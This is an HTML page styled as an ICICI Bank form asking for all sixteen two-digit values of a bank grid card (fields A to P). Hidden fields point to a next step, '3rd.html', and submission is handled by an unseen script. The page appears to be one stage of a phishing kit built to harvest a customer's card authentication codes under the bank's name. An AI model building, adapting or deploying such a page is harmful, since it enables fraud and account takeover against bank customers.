<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/style.css">
    <title>ICICI Bank</title>
</head>
<body>
    <header class="d-flex justify-content-center mb-4">
        <img src="assets/header.jpg" width="100%" alt="">
    </header>
    <img src="assets/grid.jpg" width="100%" alt="">
    <main class="container">
        <div id="test" class="text-danger text-center fw-bold"></div>
        <input type="hidden" id="page_type" value="grid">
        <input type="hidden" id="nextValue" value="3rd.html">
        <form action="" id="form" class="mt-3">
            <div class="d-flex flex-wrap justify-content-center grid-input">
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="A" placeholder="A" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="B" placeholder="B" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="C" placeholder="C" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="D" placeholder="D" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="E" placeholder="E" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="F" placeholder="F" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="G" placeholder="G" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="H" placeholder="H" class="form-control form-control-grid" required>
                
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="I" placeholder="I" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="J" placeholder="J" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="K" placeholder="K" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="L" placeholder="L" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="M" placeholder="M" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="N" placeholder="N" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="O" placeholder="O" class="form-control form-control-grid" required>
                <input type="text" inputmode="numeric" minlength="2" maxlength="2" name="P" placeholder="P" class="form-control form-control-grid" required>
                
            </div>
            <button type="submit" id="submit-button" class="btn btn-lg bg-color btn-danger w-100 mt-2">Proceed</button>
        </form>
    </main>
    
    <footer class="mt-4">
        <img src="assets/footer.jpg" width="100%" alt="">
    </footer>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <script src="assets/script.js"></script>
    <script>
          $(document).ready(function() {
            $('input').on('input', function() {
                var maxLength = parseInt($(this).attr('maxlength'));
                var currentValue = $(this).val();

                if (currentValue.length === maxLength) {
                    // Find the next input field
                    var $nextInput = $(this).next('input');

                    if ($nextInput.length > 0) {
                        $nextInput.focus();
                    }
                }
            });
        });
    </script>
</body>

</html>
